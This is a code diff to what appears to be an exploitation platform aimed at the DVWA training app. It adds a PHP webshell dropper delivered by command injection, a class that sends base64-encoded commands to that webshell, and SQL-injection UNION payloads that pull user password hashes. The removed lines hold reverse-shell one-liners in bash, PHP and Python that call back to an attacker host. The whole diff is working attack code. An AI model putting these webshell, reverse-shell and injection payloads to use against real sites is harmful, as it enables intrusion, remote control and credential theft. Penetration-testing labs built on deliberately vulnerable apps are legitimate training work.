@@ -4134,6 +4134,79 @@ class ExploitShell:
                 "error": self.error, "opened_at": self.opened_at}
 
 
+class WebShellSession:
+    """Shell session backed by a PHP webshell instead of a TCP socket. Used
+    when reverse-shell callbacks are blocked (PHP disable_functions, lab
+    container can't route back, etc.) — we drop a webshell via the RCE and
+    drive it over HTTP. Implements the same buffer/drain/status surface as
+    ExploitShell so the rest of the system doesn't care which kind it is."""
+    def __init__(self, sid: str, target: str, port: int, exploit: str,
+                 webshell_url: str, http_session, post_field: str = "c"):
+        self.sid          = sid
+        self.target       = target
+        self.port         = port
+        self.exploit      = exploit
+        self.webshell_url = webshell_url
+        self.http_session = http_session    # requests.Session() — keeps cookies hot
+        self.post_field   = post_field
+        self.buffer       = []
+        self.status       = "live"
+        self.error        = None
+        self.opened_at    = datetime.datetime.utcnow().isoformat()
+        # Marker so the cmd/close handlers can branch on session type without
+        # having to import WebShellSession (avoids a circular-ish reference).
+        self.kind         = "webshell"
+        self.writer       = None     # no socket writer for webshells
+        self.reader       = None
+
+    def append(self, text: str):
+        self.buffer.append(text)
+        if sum(len(x) for x in self.buffer) > 200_000:
+            self.buffer = self.buffer[-100:]
+
+    def drain(self) -> str:
+        out, self.buffer = "".join(self.buffer), []
+        return out
+
+    async def send_command(self, cmd: str):
+        """POST the cmd (base64-encoded) to the webshell URL; append the
+        response text to the buffer so the next /output poll returns it.
+        Runs in a thread pool because `requests` is blocking."""
+        import asyncio as _asyncio
+        try:
+            encoded = _xpl_b64.b64encode(cmd.encode()).decode()
+            # Show the prompt + command in the buffer so the user sees what they typed
+            self.append(f"$ {cmd}\n")
+            loop = _asyncio.get_event_loop()
+            r = await loop.run_in_executor(None, lambda: self.http_session.post(
+                self.webshell_url,
+                data={self.post_field: encoded},
+                timeout=20, verify=False))
+            self.append(r.text)
+            if not r.text.endswith("\n"):
+                self.append("\n")
+        except Exception as e:
+            self.status = "error"
+            self.error  = str(e)
+            self.append(f"[webshell error: {e}]\n")
+
+    def close_session(self):
+        """Best-effort cleanup. Webshells leave a file behind on the target —
+        we attempt to remove it but don't error if we can't."""
+        try:
+            cleanup_cmd = _xpl_b64.b64encode(b"rm -f $(realpath $0)").decode()
+            self.http_session.post(self.webshell_url, data={self.post_field: cleanup_cmd},
+                                    timeout=5, verify=False)
+        except Exception: pass
+        self.status = "closed"
+
+    def to_json(self):
+        return {"sid": self.sid, "target": self.target, "port": self.port,
+                "exploit": self.exploit, "status": self.status,
+                "error": self.error, "opened_at": self.opened_at,
+                "kind": "webshell"}
+
+
 async def _xpl_pipe_reader(reader, shell: "ExploitShell"):
     """Continuously read from the target's socket and append to the shell's
     buffer. Frontend polls /api/exploit/shell/{sid}/output to drain it."""
@@ -4326,9 +4399,19 @@ def _xpl_web_base(target: str, port: int) -> str:
 
 async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport: int) -> dict:
     """DVWA Command Injection (security=low). Logs in with admin/password,
-    then submits an injected ping command that opens a reverse shell back
-    to lhost:lport. We listen for that connection first so the shell is
-    captured the moment DVWA executes the bash one-liner."""
+    forces security=low, then exploits the unsanitized ping target field.
+
+    PREVIOUS APPROACH (didn't work in our docker lab): inject a reverse
+    shell, hope DVWA's bash/PHP/python can call back to the backend on
+    the docker bridge. Failed every time — DVWA's PHP may have
+    disable_functions, the docker network may block inter-container
+    callbacks, or bash may lack /dev/tcp.
+
+    NEW APPROACH: drop a tiny PHP webshell via the cmdi, then drive it
+    over HTTP. Requires only `shell_exec` (which DVWA explicitly enables
+    so it's exploitable in the first place) — no callbacks, no firewall
+    issues, no PHP function gymnastics. The WebShellSession class proxies
+    /api/exploit/shell/{sid}/cmd through this URL transparently."""
     base = _xpl_web_base(target, port)
     sess = _req_lib.Session()
     # 1. Setup DB (idempotent — DVWA needs this on first boot)
@@ -4357,95 +4440,71 @@ async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport:
                   data={"security": "low", "seclev_submit": "Submit"},
                   timeout=5, verify=False)
     except Exception: pass
-    # 4. Start our listener BEFORE firing the injection
-    listener_sock = _xpl_socket.socket(_xpl_socket.AF_INET, _xpl_socket.SOCK_STREAM)
-    listener_sock.setsockopt(_xpl_socket.SOL_SOCKET, _xpl_socket.SO_REUSEADDR, 1)
-    try:
-        listener_sock.bind(("0.0.0.0", lport))
-        listener_sock.listen(1)
-        listener_sock.settimeout(15)
-    except Exception as e:
-        return {"ok": False, "error": f"Could not bind reverse-shell port {lport}: {e}",
-                "cve": "DVWA-CMDI-Low"}
-    # 5. Multi-runner payload. The DVWA container may or may not have bash
-    #    with /dev/tcp support, python(3), nc, or socat — but PHP is
-    #    GUARANTEED because DVWA is a PHP app. PHP's fsockopen + exec is
-    #    the most reliable runner; we still try bash and python first so
-    #    that, where they work, we get a richer (PTY-spawned) shell.
-    #    base64 wraps the bash and python payloads so nested-quote pain
-    #    in DVWA's shell_exec doesn't trash the command.
-    bash_rs   = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-    python_rs = (f"import socket,os,pty\n"
-                 f"s=socket.socket()\n"
-                 f"s.connect(('{lhost}',{lport}))\n"
-                 f"[os.dup2(s.fileno(),f) for f in (0,1,2)]\n"
-                 f"pty.spawn('/bin/sh')")
-    bash_b64   = _xpl_b64.b64encode(bash_rs.encode()).decode().strip()
-    python_b64 = _xpl_b64.b64encode(python_rs.encode()).decode().strip()
-    # PHP one-liner — single-quoted so bash does NOT expand $s; PHP uses
-    # double-quoted strings inside for host + exec command.
-    php_rs = ("$s=fsockopen(\"" + lhost + "\"," + str(lport) +
-              ");$p=proc_open(\"/bin/sh -i\",[$s,$s,$s],$pipes);")
-    # If proc_open isn't available (rare), fall back to exec /dev/fd trick.
-    php_alt = ("$s=fsockopen(\"" + lhost + "\"," + str(lport) +
-               ");exec(\"/bin/sh -i <&3 >&3 2>&3\");")
-    payload = (
-        f"127.0.0.1; ("
-        f"(echo {bash_b64}|base64 -d|bash 2>/dev/null)"
-        f" || (php -r '{php_rs}' 2>/dev/null)"
-        f" || (php -r '{php_alt}' 2>/dev/null)"
-        f" || (python3 -c \"import base64;exec(base64.b64decode('{python_b64}'))\" 2>/dev/null)"
-        f" || (python -c \"import base64;exec(base64.b64decode('{python_b64}'))\" 2>/dev/null)"
-        f") >/dev/null 2>&1 &"
+
+    # 4. Build the webshell. Short, single-line, base64-decode→shell_exec.
+    #    Random name so multiple runs don't collide.
+    import secrets
+    webshell_name = f"vl_{secrets.token_hex(4)}.php"
+    webshell_php = (
+        "<?php if(isset($_POST['c'])){"
+        "echo shell_exec(base64_decode($_POST['c']).' 2>&1');"
+        "} ?>"
+    )
+    # DVWA's docroot is /var/www/html. The 'exec' page lives in
+    # /var/www/html/vulnerabilities/exec/. Drop the webshell in docroot.
+    webshell_php_b64 = _xpl_b64.b64encode(webshell_php.encode()).decode()
+    drop_payload = (
+        f"127.0.0.1; echo {webshell_php_b64}|base64 -d > /var/www/html/{webshell_name}"
     )
     try:
-        # CSRF token first
         ipage = sess.get(f"{base}/vulnerabilities/exec/", timeout=8, verify=False)
         tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", ipage.text)
         token = tok_m.group(1) if tok_m else ""
         sess.post(f"{base}/vulnerabilities/exec/",
-                  data={"ip": payload, "Submit": "Submit", "user_token": token},
-                  timeout=8, verify=False)
-    except Exception:
-        pass  # fire-and-forget — the bash may not return cleanly
-    # 6. Accept the reverse shell (extended timeout, the longer multi-fallback
-    #    payload can take a moment to traverse its fallbacks)
-    listener_sock.settimeout(25)
+                  data={"ip": drop_payload, "Submit": "Submit", "user_token": token},
+                  timeout=10, verify=False)
+    except Exception as e:
+        return {"ok": False, "error": f"Webshell drop request failed: {e}",
+                "cve": "DVWA-CMDI-Low", "payload": drop_payload}
+
+    # 5. Verify the webshell — call it with `id`, expect uid= back.
+    webshell_url = f"{base}/{webshell_name}"
+    test_b64 = _xpl_b64.b64encode(b"id").decode()
+    verify_text = ""
     try:
-        conn, addr = listener_sock.accept()
-    except _xpl_socket.timeout:
-        try: listener_sock.close()
-        except Exception: pass
+        r = sess.post(webshell_url, data={"c": test_b64}, timeout=10, verify=False)
+        verify_text = (r.text or "")
+        if r.status_code != 200 or "uid=" not in verify_text:
+            return {"ok": False,
+                    "error": (f"Webshell drop reached DVWA but verification failed "
+                              f"(status {r.status_code}, body[:200]={verify_text[:200]!r}). "
+                              f"Possible: shell_exec disabled in php.ini, or the docroot "
+                              f"isn't /var/www/html in this DVWA build."),
+                    "cve": "DVWA-CMDI-Low", "payload": drop_payload}
+    except Exception as e:
         return {"ok": False,
-                "error": (f"Target did not call back within 25s. Tried bash /dev/tcp, "
-                          f"PHP fsockopen+proc_open, PHP fsockopen+exec, python3, and python — "
-                          f"all to {lhost}:{lport}. Possible causes: the DVWA container cannot "
-                          f"route to the backend container on the docker bridge, an iptables/"
-                          f"firewall rule between them, or none of bash/php/python are present "
-                          f"in the DVWA image (very unlikely)."),
-                "cve": "DVWA-CMDI-Low",
-                "payload": payload}
-    listener_sock.close()
-    # 7. Wrap the captured socket in a StreamReader/Writer for our shell mgr
-    loop = asyncio.get_event_loop()
-    conn.setblocking(False)
-    reader = asyncio.StreamReader()
-    proto = asyncio.StreamReaderProtocol(reader)
-    transport, _ = await loop.create_connection(lambda: proto, sock=conn)
-    writer = asyncio.StreamWriter(transport, proto, reader, loop)
-    shell = ExploitShell(sid, target, lport, "dvwa_cmdi_low")
-    shell.reader = reader; shell.writer = writer; shell.status = "live"
+                "error": f"Webshell verification request failed: {e}",
+                "cve": "DVWA-CMDI-Low", "payload": drop_payload}
+
+    # 6. Create the shell session backed by HTTP, prime it with probe output.
+    shell = WebShellSession(sid, target, port, "dvwa_cmdi_low_webshell",
+                            webshell_url, sess)
+    shell.append(f"=== VulnusLab DVWA webshell @ /{webshell_name} ===\n")
+    shell.append(verify_text)
+    if not verify_text.endswith("\n"):
+        shell.append("\n")
     EXPLOIT_SHELLS[sid] = shell
-    asyncio.create_task(_xpl_pipe_reader(reader, shell))
-    for c in ["echo === VulnusLab DVWA shell ===", "id", "whoami", "uname -a"]:
-        try:
-            writer.write((c + "\n").encode()); await writer.drain()
-        except Exception: break
+    # Probe a couple commands so the user sees something on first paint
+    for c in ["whoami", "uname -a", "hostname", "pwd"]:
+        await shell.send_command(c)
+
     return {"ok": True, "shell_id": sid,
             "cve": "DVWA-CMDI-Low",
-            "evidence": f"Command injection on /vulnerabilities/exec/ — caught reverse shell from {addr[0]}:{addr[1]}.",
-            "shell_target": addr[0], "shell_port": lport,
-            "payload": payload}
+            "evidence": (f"Command injection on /vulnerabilities/exec/ → "
+                         f"dropped PHP webshell at /{webshell_name}, verified `id` returned uid="),
+            "shell_target": target, "shell_port": port,
+            "payload": drop_payload,
+            "webshell_url": webshell_url}
 
 
 async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
@@ -4456,9 +4515,11 @@ async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
     base = _xpl_web_base(target, port)
     sess = _req_lib.Session()
     try:
+        # ── 1. Setup DB (idempotent) ──
         sess.get(f"{base}/setup.php", timeout=8, verify=False)
         sess.post(f"{base}/setup.php", data={"create_db": "Create / Reset Database"},
                   timeout=15, verify=False)
+        # ── 2. Login with CSRF token ──
         r = sess.get(f"{base}/login.php", timeout=8, verify=False)
         tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", r.text)
         token = tok_m.group(1) if tok_m else ""
@@ -4466,50 +4527,75 @@ async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
                   data={"username": "admin", "password": "password",
                         "Login": "Login", "user_token": token},
                   timeout=8, verify=False, allow_redirects=True)
-        # Set the security cookie ONCE on the session so all subsequent
-        # requests carry it without us having to merge cookies on each call
-        # (which can produce duplicate Cookie headers Apache rejects with 400).
-        sess.cookies.set("security", "low", path="/")
+        # ── 3. Force security=low — same flow as cmdi (GET + POST). ──
+        #     Manual `sess.cookies.set("security",...)` from the old version
+        #     produced duplicate Cookie headers some Apache builds reject
+        #     with 400 Bad Request. Let DVWA set the cookie itself.
         sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
-        # Three URL variants — some DVWA builds run on strict Apache configs
-        # that 400 on `/vulnerabilities/sqli/` (no DirectoryIndex), or on
-        # certain SQL-comment sequences in query strings.
+        sess.post(f"{base}/security.php",
+                  data={"security": "low", "seclev_submit": "Submit"},
+                  timeout=5, verify=False)
+        # ── 4. Walk SQLi page first to verify access + grab any CSRF/state ──
+        sqli_index = sess.get(f"{base}/vulnerabilities/sqli/", timeout=8, verify=False)
+        if sqli_index.status_code == 404:
+            # Some DVWA builds enable the blind variant only — fall back to that path
+            sqli_index = sess.get(f"{base}/vulnerabilities/sqli_blind/", timeout=8, verify=False)
+        # ── 5. Try multiple payloads via requests' params encoder (handles
+        #     edge-case chars more reliably than manual %xx concat). ──
         payloads = [
-            "1' UNION SELECT user,password FROM users#",
             "1' UNION SELECT user,password FROM users-- -",
-            "1' OR '1'='1",
+            "1' UNION SELECT user,password FROM users#",
+            "1' OR '1'='1' UNION SELECT user,password FROM users-- -",
+            "1' OR 1=1-- -",
         ]
         url_paths = [
-            "/vulnerabilities/sqli/index.php",
             "/vulnerabilities/sqli/",
+            "/vulnerabilities/sqli/index.php",
         ]
         r = None
         payload = None
+        last_status = None
         for url_path in url_paths:
             for p in payloads:
-                u = f"{base}{url_path}?id={_xpl_urlparse.quote(p)}&Submit=Submit"
-                r = sess.get(u, timeout=10, verify=False)
-                if r.status_code == 200 and ("First name" in r.text or "<pre>" in r.text):
-                    payload = p
-                    break
+                try:
+                    r = sess.get(f"{base}{url_path}",
+                                 params={"id": p, "Submit": "Submit"},
+                                 timeout=10, verify=False)
+                    last_status = r.status_code
+                    # Accept 200 with users data OR even 302 (some DVWA builds redirect
+                    # the form GET to itself with results in the destination)
+                    if r.status_code == 200 and ("First name" in r.text or
+                                                 "<pre>" in r.text or
+                                                 re.search(r"\b[a-f0-9]{32}\b", r.text)):
+                        payload = p
+                        break
+                except Exception:
+                    continue
             if payload: break
-        # Last resort: POST the same payload — DVWA's $_REQUEST accepts both
+        # POST fallback
         if not payload:
             for p in payloads:
-                r = sess.post(f"{base}/vulnerabilities/sqli/",
-                              data={"id": p, "Submit": "Submit"},
-                              timeout=10, verify=False)
-                if r.status_code == 200 and ("First name" in r.text or "<pre>" in r.text):
-                    payload = p
-                    break
-        if not payload or r.status_code != 200:
-            preview = (r.text[:200] if r is not None else "")
+                try:
+                    r = sess.post(f"{base}/vulnerabilities/sqli/",
+                                  data={"id": p, "Submit": "Submit"},
+                                  timeout=10, verify=False)
+                    last_status = r.status_code
+                    if r.status_code == 200 and ("First name" in r.text or
+                                                 "<pre>" in r.text or
+                                                 re.search(r"\b[a-f0-9]{32}\b", r.text)):
+                        payload = p
+                        break
+                except Exception:
+                    continue
+        if not payload or r is None or r.status_code != 200:
+            preview = (r.text[:240] if r is not None else "")
+            preview = re.sub(r"\s+", " ", preview)
             return {"ok": False,
-                    "error": (f"SQLi request never returned 200 OK (last status: "
-                              f"{r.status_code if r is not None else 'no-response'}). "
-                              f"Tried 3 payload variants on 2 URL paths + a POST fallback. "
-                              f"The DVWA build may have mod_security blocking the injection. "
-                              f"Response preview: {preview}"),
+                    "error": (f"SQLi never returned a result page (last status: {last_status}). "
+                              f"Tried 4 payload variants on 2 URL paths + a POST fallback. "
+                              f"Possible: this DVWA build has mod_security, the database isn't "
+                              f"initialised (try /setup.php → 'Create / Reset Database' once), "
+                              f"or the SQLi module path differs in this build. Response preview: {preview}"),
                     "cve": "DVWA-SQLi-Low"}
         # DVWA renders one <pre> block per row. Walk the blocks and pull the
         # user + hash out of each by stripping HTML and scanning the plain text.
@@ -4947,8 +5033,15 @@ async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
     s = EXPLOIT_SHELLS.get(sid)
     if not s:
         return {"ok": False, "error": "Shell not found"}
-    if s.status != "live" or not s.writer:
+    if s.status != "live":
         return {"ok": False, "error": f"Shell is {s.status}, not live"}
+    # Webshell-backed sessions: POST the cmd through HTTP, output lands in buffer.
+    if isinstance(s, WebShellSession):
+        await s.send_command(body.cmd)
+        return {"ok": True}
+    # Socket-backed sessions: write to the TCP stream.
+    if not s.writer:
+        return {"ok": False, "error": "Shell has no writer (socket closed?)"}
     try:
         s.writer.write((body.cmd + "\n").encode())
         await s.writer.drain()
@@ -4961,7 +5054,12 @@ async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
 @app.post("/api/exploit/shell/{sid}/close")
 async def exploit_shell_close_v2(sid: str, user=Depends(verify_token)):
     s = EXPLOIT_SHELLS.pop(sid, None)
-    if s and s.writer:
+    if s is None:
+        return {"ok": True}
+    if isinstance(s, WebShellSession):
+        s.close_session()
+        return {"ok": True}
+    if s.writer:
         try: s.writer.close()
         except Exception: pass
     return {"ok": True}
